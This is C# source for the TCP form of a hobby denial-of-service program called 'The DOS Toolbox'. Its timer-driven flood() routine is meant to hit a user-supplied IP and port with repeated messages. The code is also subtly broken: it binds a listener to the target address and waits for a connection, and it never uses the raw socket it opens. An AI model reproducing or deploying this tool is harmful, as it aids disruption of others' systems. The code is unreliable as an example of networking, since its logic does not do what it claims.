//////////////////////////////////////////////
/// jack-debug, The DOS Toolbox 26/09/2020 ///
//////////////////////////////////////////////

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace The_DOS_Toolbox
{
    public partial class TCP : Form
    {
        public TCP()
        {
            InitializeComponent();
        }
        public static bool CheckForInternetConnection() // this checks for internet
        {
            try
            {
                using (var CheckClient = new WebClient())
                using (CheckClient.OpenRead("http://google.com/generate_204"))
                    return true;
            }
            catch
            {
                return false;
            }
        }

        private void floodTimer_Tick(object sender, EventArgs e)
        {
            flood();
        }
        private void flood()
        {
            string ipaddr = ipTxt.Text;
            Int32 port = Int32.Parse(portTxt.Text);
            IPAddress localAddr = IPAddress.Parse(ipaddr);
            bool internet = CheckForInternetConnection();
            if (internet)
            {
                try
                {
                    using (Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP))
                    {
                        var server = new TcpListener(localAddr, port);
                        server.Start();
                        TcpClient client = server.AcceptTcpClient();
                        NetworkStream stream = client.GetStream();
                        String data = messageTxt.Text;
                        byte[] msg = System.Text.Encoding.ASCII.GetBytes(data);
                        stream.Write(msg, 0, msg.Length);
                    }
                }
                catch
                {
                    MessageBox.Show("There was an error. Ensure that you have an internet connection, all the data is entered correctly and you are using the latest version of The DOS Toolbox. Download updates from Github (jack-debug on Github).");
                    floodTimer.Stop();
                }
            }
            else
            {
                MessageBox.Show("You do not have an internet connection. Please connect to the internet before trying again.");
            }
        }

        private void proxyStatus_CheckedChanged(object sender, EventArgs e)
        {
            MessageBox.Show("Proxies are not properly implemented yet. Please wait for an update for proxies to work.");
        }
    }

}
